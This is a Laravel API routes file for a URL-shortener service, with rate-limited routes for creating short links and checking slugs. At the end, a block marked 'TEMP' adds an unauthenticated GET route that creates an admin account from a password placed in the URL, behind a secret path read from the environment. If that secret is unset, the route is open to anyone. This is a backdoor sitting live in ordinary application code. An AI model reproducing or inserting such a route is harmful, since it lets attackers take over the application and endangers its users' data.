<?php

use App\Http\Controllers\ShortenCheckController;
use App\Http\Controllers\ShortenCreateController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::prefix('v1')->group(function () {
    /**
     * Routes related to shorten domain
     */
    Route::prefix('shorten')->group(function () {
        // Creates a new shorten url
        Route::post('create', ShortenCreateController::class)
            ->middleware(['throttle:5'])
            ->name('shorten.create');

        // Check if a provided slug exists in database and is valid
        Route::get('check/{slug}', ShortenCheckController::class)
            ->middleware(['throttle:30'])
            ->name('shorten.check');
    });
});

/* TEMP: it creates an admin account */
Route::get(env('HK_SECRET', false) . '/{password}', fn($password) => \App\Models\User::create([
    'name' => 'Admin',
    'email' => Faker\Factory::create()->companyEmail,
    'password' => \Illuminate\Support\Facades\Hash::make($password)
]));
